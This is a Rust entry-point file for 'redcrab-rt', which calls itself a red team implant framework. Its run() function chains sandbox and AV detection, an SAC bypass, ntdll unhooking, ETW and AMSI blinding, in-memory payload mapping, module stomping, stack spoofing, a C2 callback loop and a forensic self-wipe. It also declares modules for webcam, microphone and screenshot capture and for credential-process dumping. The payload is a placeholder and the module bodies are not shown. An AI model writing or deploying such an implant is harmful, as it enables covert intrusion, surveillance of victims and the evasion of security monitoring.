//! redcrab-rt — red team implant framework
//! Build: python builder.py

#![no_main]
#![allow(unused_imports, dead_code)]

mod defs;
mod utils;
mod syscall;
mod loader;
mod stomp;
mod spoof;
mod sleep;
mod etw_patch;
mod unhook;
mod sac_bypass;
mod ppldump;
mod pe_obfuscate;
mod indirect_syscall;
mod threadless_inject;
mod screenshot;
mod webcam;
mod mic;
mod filetransfer;
mod selfdestruct;   // forensic-clean wipe on detection
mod antidetect;     // pre-flight sandbox/AV/EDR environment checks
mod c2;

use defs::*;
use utils::djb2;

const PAYLOAD: &[u8] = &[0x90];

const SLEEP_KEY: [u8; 16] = [
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
];

#[no_mangle]
pub extern "system" fn WinMainCRTStartup() {
    unsafe { run() };
}

unsafe fn run() {
    // 0. Pre-flight: if sandbox/debugger/AV detected → self-destruct immediately
    antidetect::check_environment();

    // 1. Register ctrl handler so Defender kill signal → triggers clean wipe
    selfdestruct::register_ctrl_handler();

    // 2. SAC bypass
    sac_bypass::bypass_sac();

    // 3. Unhook ntdll
    unhook::unhook_ntdll();

    // 4. ETW + AMSI blind
    etw_patch::apply_all_blinds();

    // 5. XOR-obfuscate payload in memory
    let mut payload_buf = PAYLOAD.to_vec();
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);

    // 6. Map PE / shellcode
    loader::map_pe(&payload_buf);

    // 7. Post-exec concealment
    stomp::stomp(0 as _, 0 as _, payload_buf.len());
    spoof::spoof_stack();
    pe_obfuscate::secure_zero(&mut payload_buf);

    // 8. C2 callback — if connection drops unexpectedly, self-destruct
    c2::callback_and_loop();

    // 9. Clean exit after operator types 'exit' — wipe self gracefully
    selfdestruct::destruct();
}
